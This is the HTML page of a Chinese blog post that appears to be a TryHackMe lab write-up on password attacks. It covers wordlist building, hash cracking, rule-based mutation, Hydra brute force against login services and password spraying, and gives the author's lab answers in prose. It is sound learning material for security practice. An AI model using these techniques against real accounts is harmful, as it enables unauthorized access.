<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-password攻击 | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-password攻击"><meta name="application-name" content="THM-password攻击"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-password攻击"><meta property="og:url" content="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 介绍 这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：  Password profiling Password attacks techniques Online password attacks  什么是密码 密码用作个人访"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 介绍 这个房间介绍密码攻击中使用的类型和技术。我们将讨论获取和生成自定义密码列表的方法。以下是我们将讨论的一些主题：  Password profiling Password attacks techniques Online password attacks  什么是密码 密码用作个人访"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/07/14/thm-password-gong-ji/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'THM-password攻击',
  postAI: '',
  pageFillDescription: '0x01 介绍, 什么是密码, 密码的安全性如何, 0x02 密码攻击技术, 密码破解与密码猜测, 0x03 密码分析- 默认、弱、泄露、组合和用户名单词列表, 默认密码, 弱密码, 密码泄露, 组合词表, 定制词汇表, 用户名单词列表, 0x04 密码分析- 密钥空间技术和 CUPP, Keyspace技术, CUPP - 常用用户密码分析器, 0x05 离线攻击 - 字典和暴力破解, 字典攻击, 蛮力攻击, 0x06 离线攻击 - 基于规则, 基于规则的攻击, 0x07 部署虚拟机, 在线密码攻击, Hydra, FTP, SMTP, SSH, HTTP 登录页面, 实践练习, 密码喷洒攻击, SSH, RDP, Outlook Web Access (OWA) portal, SMB, 实践练习, 0x08 总结介绍这个房间介绍密码攻击中使用的类型和技术我们将讨论获取和生成自定义密码列表的方法以下是我们将讨论的一些主题什么是密码密码用作个人访问计算机系统或应用程序的身份验证方法使用密码可确保帐户的所有者是唯一有权访问的人但是如果密码被共享或落入坏人之手则可能会对给定系统进行未经授权的更改未经授权的访问可能会导致系统整体状态和运行状况发生变化或损坏文件系统密码通常由字母数字和符号等字符的组合组成因此如何生成密码取决于用户密码的集合通常称为字典或单词列表在各类公开披露的密码数据泄露事件中常见的是复杂度低容易被猜测的密码例如易于猜测的密码可以是密码等等以下是最常见和最常见的密码供您参考因此攻击者对目标或服务进行密码攻击来猜测密码不会花费很长时间也很困难选择强密码是一个很好的做法这样就很难猜测或破解强密码不应是常见单词或在字典中找到的密码并且密码长度至少应为八个字符它还应包含大写和小写字母数字和符号字符串例如有时公司有自己的密码策略并强制用户在创建密码时遵循准则这有助于确保用户不在其组织内使用常见或弱密码并可以限制暴力破解等攻击媒介例如密码长度必须为八个字符或更多包括字符一对数字和至少一个符号然而如果攻击者弄清楚了密码策略他就可以生成满足帐户密码策略的密码列表密码的安全性如何密码是访问在线帐户或计算机系统的一种保护方法密码认证方法用于访问个人和私人系统其使用密码的主要目的是保证密码安全并且不与他人共享回答这个问题密码的安全性如何取决于各种因素密码通常存储在文件系统或数据库中保证它们的安全至关重要我们见过一些公司将密码存储在明文文档中的案例例如年索尼的数据泄露事件因此一旦攻击者访问文件系统他就可以轻松获取并重复使用这些密码另一方面其他人使用散列函数或加密算法等各种技术在系统内存储密码以使其更加安全即使攻击者必须访问系统破解起来也会更加困难我们将在接下来的任务中介绍破解哈希值密码攻击技术在这个房间里我们将讨论可用于执行密码攻击的技术我们将介绍各种技术例如字典暴力破解规则库和猜测攻击所有上述技术都被视为主动在线攻击攻击者需要与目标计算机通信以获取密码以便获得对计算机的未经授权的访问密码破解与密码猜测本节从网络安全角度讨论密码破解术语此外我们还将讨论密码破解和密码猜测之间的显着差异最后我们将演示用于密码破解的各种工具包括和密码破解是一种用于从加密或散列数据到明文数据发现密码的技术攻击者可能会从受感染的计算机获取加密或散列的密码或者通过网络传输数据捕获它们一旦获得密码攻击者就可以利用密码攻击技术使用各种工具破解这些散列密码密码破解被认为是渗透测试的传统技术之一主要目标是让攻击者升级到更高的权限并访问计算机系统或网络密码猜测和密码破解是信息安全专业人员经常使用的方法两者都有不同的含义和含义密码猜测是一种基于字典猜测在线协议和服务密码的方法以下是密码破解和密码猜测之间的主要区别密码猜测是一种用于针对在线协议和服务的技术因此它被认为是耗时的并且提供了为失败的登录尝试生成日志的机会在基于的系统上进行的密码猜测攻击通常需要每次尝试都发送一个新的请求这很容易被检测到如果系统设计和配置安全可能会导致帐户被锁定密码破解是一种在本地或由攻击者控制的系统上执行的技术密码分析默认弱泄露组合和用户名单词列表拥有良好的单词表对于成功进行密码攻击至关重要了解如何生成用户名列表和密码列表非常重要在本节中我们将讨论创建目标用户名和密码列表我们还将涵盖各种主题包括默认密码弱密码泄露密码以及创建目标单词列表默认密码在执行密码攻击之前值得针对目标服务尝试几个默认密码制造商为交换机防火墙路由器等产品和设备设置默认密码在某些情况下客户不更改默认密码这会使系统容易受到攻击因此尝试一下等是一个很好的做法如果我们知道目标设备我们可以查找默认密码并尝试它们例如假设目标服务器是一个轻量级的开源应用程序服务器在这种情况下我们可以尝试几个可能的默认密码或以下是一些提供各种产品默认密码的网站列表弱密码随着时间的推移专业人士会收集并生成弱密码列表并经常将它们组合成一个大的单词列表列表是根据他们的经验以及他们在渗透测试中看到的内容生成的这些列表还可能包含已公开发布的泄露密码以下是一些常见的弱密码列表这包括最著名的密码集合各种列表的巨大集合不仅用于密码破解密码泄露密码或哈希值等敏感数据可能会因违规而被公开披露或出售这些公共或私人可用的泄漏通常被称为转储根据转储的内容攻击者可能需要从数据中提取密码在某些情况下转储可能只包含密码的哈希值需要破解才能获得纯文本密码以下是一些常见的弱密码泄露密码列表包括公司的泄露密码泄露数据库组合词表假设我们有多个单词表然后我们可以将这些单词列表合并成一个大文件可以使用按如下方式完成此操作要清理生成的组合列表以删除重复的单词我们可以使用和如下所示定制词汇表自定义密码列表是增加找到有效凭据的机会的最佳方法之一我们可以从目标网站创建自定义密码列表通常公司的网站包含有关公司及其员工的宝贵信息包括电子邮件和员工姓名此外该网站可能包含特定于公司所提供产品的关键字包括产品和服务名称这些关键字可能会在员工的密码中使用等工具可用于有效地抓取网站并提取字符串或关键字是一个强大的工具可以生成特定于给定公司或目标的单词列表请考虑以下示例将把内容写入文件在本例中为收集个或更多字符的字符串单词是网络爬行蜘蛛的深度级别默认是将要使用的因此我们现在应该有一个基于特定企业的相关单词例如名称位置和许多商业术语的适当大小的单词列表同样创建的单词列表可用于模糊用户名应用我们讨论的内容使用针对来解析所有单词并生成最小长度为的单词列表请注意我们稍后将在另一个任务中使用此单词列表用户名单词列表在点查阶段收集员工姓名至关重要我们可以从目标网站生成用户名列表对于下面的示例我们假设我们有一个例如和一个生成用户名的方法名字姓氏的第一个字母姓氏名字的第一个字母名字姓氏的第一个字母名字姓氏的第一个字母值得庆幸的是如果我们有名字和姓氏有一个工具可以帮助创建包含大多数可能组合的列表使用显示该工具的帮助消息和可选参数现在让我们创建一个包含全名的单词列表到文本文件中然后我们将运行该工具来生成给定全名的可能组合这只是自定义用户名生成器的一个示例请随意探索更多选项甚至用您选择的编程语言创建自己的选项密码分析密钥空间技术和技术准备单词列表的另一种方法是使用键空间技术在这种技术中我们在单词列表中指定一系列字符数字和符号是用于创建离线单词列表的众多强大工具之一通过我们可以指定许多选项包括和选项如下所示以下示例创建一个包含个字符的所有可能组合包括和的单词列表我们可以使用参数并指定一个文件来保存输出这是输出的片段值得注意的是可以生成非常大的文本文件具体取决于您指定的字长和组合选项以下命令创建一个最小和最大长度为个字符的列表其中包含数字小写字母和大写字母生成的文件大小为包含个单词还允许我们使用选项指定字符集来组合我们选择的单词以下是一些其他选项可用于帮助您创建不同的选择组合小写字母字符大写字母字符数字字符特殊字符包括空格例如如果我们知道密码的一部分并且我们知道它以开头并跟随两个数字则我们可以使用上面的符号来匹配数字这里我们生成一个单词列表其中包含后跟个数字常用用户密码分析器是一个用编写的自动交互式工具用于创建自定义单词列表例如如果您知道特定目标的一些详细信息例如生日宠物名公司名称等那么这可能是一个有用的工具可以根据这些已知信息生成密码将获取所提供的信息并根据所提供的信息生成自定义单词列表还支持模式该模式用数字替换字母例如将替换为或将替换为有关该工具的更多信息请访问此处的存储库要运行我们需要安装然后使用将存储库克隆到本地计算机如下所示现在将当前目录更改为并运行或使用查看可用选项支持交互模式它会询问有关目标的问题并根据提供的答案创建自定义单词列表如果您没有给定字段的答案请按键跳过它结果会生成一个自定义单词列表其中包含基于您的条目的各种数量的单词预先创建的单词列表可以下载到您的计算机如下所示根据您的兴趣您可以从上面的列表中选择单词列表以帮助生成用于暴力破解的单词列表最后还可以使用选项从数据库提供默认用户名和密码离线攻击字典和暴力破解本节讨论离线攻击包括字典攻击暴力攻击和基于规则的攻击字典攻击字典攻击是一种通过使用众所周知的单词或短语来猜测密码的技术字典攻击完全依赖于先前生成或找到的预先收集的单词列表为了在这次攻击中取得成功为你的目标选择或创建最佳候选单词列表非常重要让我们探索使用您在之前有关生成单词列表的任务中学到的知识来执行字典攻击我们将展示使用的离线字典攻击是一种流行的哈希破解工具假设我们获得以下哈希值并且想要执行字典攻击来破解它首先我们至少需要了解以下内容这是什么类型的哈希我们将使用什么单词表或者我们可以使用什么类型的攻击模式为了识别哈希的类型我们可以使用或等工具对于本例认为可能的哈希方法是请注意破解哈希值的时间取决于您使用的硬件和或两者对比感觉还是第二个好点设置攻击模式为字典攻击设置破解哈希值的哈希模式对于其他类型请运行以获取支持的哈希列表此选项可以是像我们的示例一样的单个哈希值也可以是包含一个或多个哈希值的文件用于我们攻击的文件如果哈希值已被破解我们使用选项运行以显示破解值结果破解值为蛮力攻击暴力破解是攻击者用来获取对个人帐户的未经授权的访问的常见攻击此方法用于通过发送标准密码组合来猜测受害者的密码字典和暴力攻击之间的主要区别在于字典攻击使用包含所有可能密码的单词列表相反暴力攻击旨在尝试一个或多个字符的所有组合例如假设我们有一个需要未经授权访问的银行帐户我们知道包含位数字作为密码我们可以执行从到的暴力攻击以根据这些知识猜测有效的在其他情况下可以将数字或字母序列添加到列表中的现有单词中例如例如具有可用于生成您自己的组合的字符集选项字符集可以在帮助选项中找到下面的示例展示了我们如何将与我们选择的暴力攻击模式结合使用设置攻击方式为暴力攻击告诉使用数字在我们的例子中表示从开始到结束的四位数字将结果打印到终端现在让我们应用相同的概念来破解以下哈希一个四位数的码离线攻击基于规则基于规则的攻击基于规则的攻击也称为混合攻击基于规则的攻击假设攻击者了解密码策略规则用于在给定密码策略的指导范围内创建密码并且理论上应该只生成有效的密码在生成符合策略的密码时使用预先存在的单词列表可能很有用例如操纵或修改密码例如等对于这种攻击我们可以使用或来扩展我们的单词列表然而对于这次攻击让我们看看开膛手约翰是如何工作的通常有一个包含规则集的配置文件该文件位于或具体取决于您的发行版或的安装方式您可以阅读并查找以查看所有可用规则我们可以看到我们有很多规则可供我们使用我们将创建一个只有一个包含字符串的密码的单词列表看看如何扩展该单词列表让我们选择一个规则规则它包含最好的条内置规则看看它能做什么指定单词列表或词典文件指定要使用的规则将输出打印到终端计算产生了多少行通过运行前面的命令我们将密码列表从个密码扩展到个密码现在让我们检查另一个规则中最好的规则之一使用各种内置和自定义规则来生成复杂的密码列表欲了解更多信息请访问此网站现在让我们使用这个规则来检查是否在我们的列表中可用上一个命令的输出显示我们的列表具有复杂版本的即最后我们建议您查看所有规则并找到最适合您的规则许多规则将组合应用于现有的单词列表并扩展单词列表以增加找到有效密码的机会开膛手约翰可以提供很多东西例如我们可以构建自己的规则并在运行时使用它而正在破解哈希或使用该规则构建自定义单词列表假设我们想要从预先存在的词典创建自定义单词列表并对原始词典进行自定义修改目标是在每个单词的开头添加特殊字符例如并在末尾添加数字格式如下符号单词我们可以将规则添加到的末尾指定规则名称使用表示原始单词列表字典中的单个单词在单词末尾附加一个数字从到对于两位数我们可以添等在每个单词的开头添加一个特殊字符表示行单词的开头请注意将更改为会将特殊字符附加到行单词的末尾现在让我们创建一个包含单个单词的文件看看如何使用此规则扩展单词列表我们使用选项在命令中包含我们创建的规则的名称我们还需要在终端中显示结果我们可以通过使用来做到这一点如下所示现在是练习创建自己的规则的时候了部署虚拟机部署附加的虚拟机以应用我们在本会议室讨论的知识连接的虚拟机有各种在线服务可以执行密码攻击需要自定义单词列表来查找有效的凭据我们建议使用创建您的自定义单词列表要使用针对网站生成单词列表请注意您还需要生成一个用户名单词列表如在线攻击问题的任务密码分析中所示在线密码攻击在线密码攻击涉及猜测使用用户名和密码身份验证方案的网络服务的密码包括等服务本节展示使用这是攻击登录时使用的常用工具用于各种网络服务支持广泛的网络服务攻击在本节中我们将使用暴力破解网络服务例如登录页面和通常在中每个服务都有自己的选项并且期望的语法需要习惯检查帮助选项以获取更多信息和功能非常重要在下面的场景中我们将对服务器执行暴力攻击通过查看帮助选项我们知道攻击服务器的语法如下我们指定单个用户名使用作为用户名单词列表指定的完整路径可以使用指定单个密码目标的协议和地址或完全限定域名请记住有时您不需要暴力破解可以先尝试默认凭据尝试攻击连接的虚拟机上的服务器并回答以下问题与服务器类似我们也可以使用暴力破解服务器语法与前面的示例类似唯一的区别是目标协议请记住如果您想尝试其他在线密码攻击工具您可能需要指定端口号即请务必阅读该工具的帮助选项如果您的服务器可以访问则暴力破解可能很常见支持许多协议包括我们可以使用前面的语法来执行我们的攻击值得注意的是密码攻击依赖于拥有出色的单词列表来增加找到有效用户名和密码的机会登录页面在这种情况下我们将暴力破解登录页面为此首先您需要了解您正在暴力破解什么使用指定请求的类型非常重要无论是还是检查选项我们可以看到的选项语法如下表单参数条件字符串可选可选正如我们之前提到的我们需要分析需要发送的请求这可以通过使用浏览器开发工具或使用代理例如来完成我们指定单个用户名使用作为用户名单词列表指定的完整路径可以使用指定单个密码目标的地址或完全限定域名请求的类型可以是或接下来我们使用以下命令指定分割的路径和条件目标网络服务器上登录页面的路径暴力破解的参数我们注入来暴力破解用户名注入来破解指定字典中的密码以下部分对于通过使用条件来消除误报非常重要同时还有成功条件通过分析网页或在枚举阶段您将获得有关这些情况的更多信息您为这些值设置的内容取决于您从服务器收到的针对失败登录尝试和成功登录尝试的响应例如如果您登录失败后在网页上收到密码无效的消息请设置无效密码或者例如在枚举过程中我们发现服务器提供使用有效凭据登录登录页面后我们可以猜测页面上的某处将有因此我们可以告诉在每个请求的中查找文本识别有效凭证的成功条件在找到有效的用户名和密码后停止暴力攻击您可以通过访问在连接的虚拟机上进行尝试如果您尚未回答以下问题请务必部署附加的虚拟机最后值得检查其他在线密码攻击工具来扩展您的知识例如实践练习您能在不进行暴力破解的情况下猜出凭据吗旗帜是什么匿名登录即可在本题中您需要从上一个任务中的单词列表生成基于规则的字典电子邮件密码是什么注意密码格式如下首先利用深度爬取目标网站泄露的信息用于构建密码字典得到初步单词列表随后根据提示构建自己的规则生成对用的密码单词列表之后根据这个字典用枚举邮件网站的登陆凭据使用对登录页面的帐户执行暴力攻击旗帜是什么就是不知为何非要利用选项才可以如果时选项会展示多个无效密码执行基于规则的密码攻击以获取帐户的访问权限在以下网站找到该标志旗帜是什么注意使用字典来生成和扩展单词列表密码喷洒攻击此任务将教授密码喷射攻击的基础知识以及针对常见在线服务执行各种攻击场景所需的工具密码喷射是一种用于识别有效凭据的有效技术如今密码喷射被认为是发现弱密码的常见密码攻击之一该技术可用于攻击各种在线服务和身份验证系统例如应用程序等暴力攻击针对特定用户名来尝试许多弱且可预测的密码虽然密码喷射攻击使用一个常见的弱密码来针对许多用户名但这可能有助于避免帐户锁定策略下图解释了密码喷射攻击的概念其中攻击者对多个用户使用一个通用密码普通密码和弱密码通常遵循一定的模式和格式下面可以找到一些常用的密码及其总体格式当前季节紧接着当前年份当前月份后跟当前年份使用公司名称和随机数字如果组织内部强制执行密码复杂性策略我们可能需要创建一个包含满足要求的符号的密码例如等要成功进行密码喷射攻击我们需要枚举目标并创建有效用户名列表或电子邮件地址列表接下来我们将针对不同的服务应用不同场景的密码喷射技术包括假设我们已经枚举了系统并创建了有效的用户名列表这里我们可以使用用密码对服务进行密码喷射攻击请注意是加载有效用户名列表对的服务使用密码上面的输出表明我们已成功找到凭据假设我们在端口上发现了暴露的服务我们可以使用等工具对进行密码喷射首先按照该工具的存储库中的安装说明在攻击计算机上安装该工具作为该工具的新用户我们将首先执行命令来查看如何使用该工具现在让我们尝试使用选项将指定为用户名并使用选项设置选项是选择单个主机进行攻击上面的输出显示我们成功找到了有效的凭据受害者请注意如果我们处于环境中我们可以使用选项指定域名有各种工具可以针对不同的服务执行喷洒密码攻击例如实践练习使用以下用户名列表执行密码喷射攻击以访问服务器以读取旗帜是什么根据给的提示季节年份特殊字符对于季节请考虑使用而不是对于年份请尝试之间的年份那只能先自定义规则通过来生成密码列表了先构造含有的文件然后自定义规则之后生成目标单词列表接着爆破即可总结该会议室介绍了不同密码攻击的基本概念以及如何创建自定义和有针对性的密码列表我们涵盖并讨论了各种主题包括默认弱泄漏的组合词表密码分析离线密码攻击在线密码攻击',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-01 16:12:31',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg 